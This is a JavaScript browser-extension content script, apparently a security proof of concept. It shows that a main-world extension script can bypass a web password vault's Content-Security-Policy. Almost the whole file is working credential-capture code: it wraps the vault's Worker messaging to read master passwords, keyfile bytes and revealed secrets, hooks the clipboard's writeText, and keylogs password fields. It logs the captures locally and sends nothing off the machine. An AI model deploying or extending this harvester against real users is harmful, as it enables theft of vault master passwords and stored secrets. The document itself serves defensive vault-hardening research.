// harvester.js — runs in the MAIN world at document_start.
//
// PURPOSE: authorized security research against our own Portunus instance.
// This file demonstrates *why* a page-CSP-based perimeter cannot protect a
// zero-knowledge web vault from a hostile browser extension. A content script
// declared with "world": "MAIN" executes in the page's own JavaScript realm,
// with the page's own privileges, and is NOT governed by the page's
// Content-Security-Policy. So every defense Portunus builds on "keep hostile
// script out of the page" is already bypassed before Portunus's bundle loads.
//
// SCOPE LIMIT (deliberate): this PoC only *observes and logs locally* to prove
// interception. It does not transmit anything off the machine — there is no
// network exfiltration here. That is enough to demonstrate the exposure and to
// drive the hardening discussion. Do not extend this into a real stealer.

(() => {
  "use strict";

  const TAG = "[vault-harvester]";
  const captured = [];

  // Local-only sink. We surface findings to the console and to a floating
  // badge on the page so the interception is visible during testing. There is
  // intentionally no remote sink.
  function record(kind, detail) {
    const entry = { t: new Date().toISOString(), kind, detail };
    captured.push(entry);
    // eslint-disable-next-line no-console
    console.warn(TAG, kind, detail);
    try {
      window.dispatchEvent(
        new CustomEvent("__vault_harvester__", { detail: entry }),
      );
    } catch {}
    paintBadge();
  }

  // ---- 1. Worker message channel -----------------------------------------
  // Portunus isolates keys + plaintext in a dedicated Worker and talks to it
  // over postMessage. That boundary is a process/memory boundary, not a trust
  // boundary against page-realm script: we sit on the same channel.
  //
  //   outgoing  : open/create/verifyPassword/changePassword  -> MASTER PASSWORD
  //               + keyfile bytes travel as call arguments.
  //   incoming  : reveal/totp/exportKeyfile results           -> every secret
  //               the user views comes back as plaintext.
  const RealWorker = window.Worker;
  if (typeof RealWorker === "function") {
    window.Worker = function PatchedWorker(url, options) {
      const w = new RealWorker(url, options);
      try {
        w.addEventListener("message", (e) => {
          scan("worker->page", e && e.data);
        });
      } catch {}
      const realPost = w.postMessage.bind(w);
      w.postMessage = function (msg, ...rest) {
        scan("page->worker", msg);
        return realPost(msg, ...rest);
      };
      return w;
    };
    window.Worker.prototype = RealWorker.prototype;
    record("hook-installed", "window.Worker wrapped");
  }

  // Pull anything secret-looking out of an RPC request/response envelope.
  function scan(dir, data) {
    if (!data || typeof data !== "object") return;
    const { method, args, result } = data;
    if (dir === "page->worker" && method) {
      // open/create: args[1] = { password, keyfile }
      // verifyPassword/changePassword/exportKeyfile: password(s) in args
      const secrets = findSecrets(args);
      if (secrets.length) {
        record("MASTER-CREDENTIAL", { method, secrets });
      }
    }
    if (dir === "worker->page" && result !== undefined) {
      const hit = findSecrets(result);
      if (hit.length) record("REVEALED-SECRET", { result: hit });
      else if (typeof result === "string" && result)
        record("REVEALED-SECRET", { result });
    }
  }

  function findSecrets(v, out = [], depth = 0) {
    if (depth > 4 || v == null) return out;
    if (typeof v === "string") {
      if (v) out.push(v);
    } else if (v instanceof Uint8Array || ArrayBuffer.isView(v)) {
      out.push("<" + v.byteLength + " key bytes>");
    } else if (Array.isArray(v)) {
      for (const x of v) findSecrets(x, out, depth + 1);
    } else if (typeof v === "object") {
      for (const k of ["password", "keyfile", "code", "secret", "totp"]) {
        if (k in v) findSecrets(v[k], out, depth + 1);
      }
    }
    return out;
  }

  // ---- 2. Clipboard -------------------------------------------------------
  // "Copy password" is the most common way users move a secret. The page
  // realm owns navigator.clipboard.
  try {
    const clip = navigator.clipboard;
    if (clip && clip.writeText) {
      const realWrite = clip.writeText.bind(clip);
      clip.writeText = function (text) {
        record("CLIPBOARD", { text });
        return realWrite(text);
      };
    }
  } catch {}

  // ---- 3. Master-password keystrokes -------------------------------------
  // Belt-and-suspenders: capture typing into any password field (the unlock
  // screen) directly, independent of the Worker hook.
  let buf = "";
  window.addEventListener(
    "keydown",
    (e) => {
      const el = e.target;
      if (el && el.tagName === "INPUT" && el.type === "password") {
        if (e.key === "Enter") {
          if (buf) record("KEYLOG-password-field", { typed: buf });
          buf = "";
        } else if (e.key === "Backspace") {
          buf = buf.slice(0, -1);
        } else if (e.key.length === 1) {
          buf += e.key;
        }
      }
    },
    true,
  );

  // ---- visible proof badge ----
  let badge;
  function paintBadge() {
    try {
      if (!document.body) return;
      if (!badge) {
        badge = document.createElement("div");
        badge.style.cssText =
          "position:fixed;z-index:2147483647;bottom:8px;right:8px;max-width:360px;" +
          "font:12px/1.4 monospace;background:#300;color:#f88;padding:8px 10px;" +
          "border:1px solid #f44;border-radius:6px;white-space:pre-wrap;" +
          "box-shadow:0 2px 12px #0008;pointer-events:none";
        document.body.appendChild(badge);
      }
      const last = captured.slice(-6).map((c) => `• ${c.kind}`);
      badge.textContent =
        `☠ harvester: ${captured.length} captures\n` + last.join("\n");
    } catch {}
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", paintBadge);
  } else {
    paintBadge();
  }

  // Expose the capture log for inspection during testing.
  Object.defineProperty(window, "__vaultHarvesterLog", {
    get: () => captured.slice(),
    configurable: true,
  });
})();
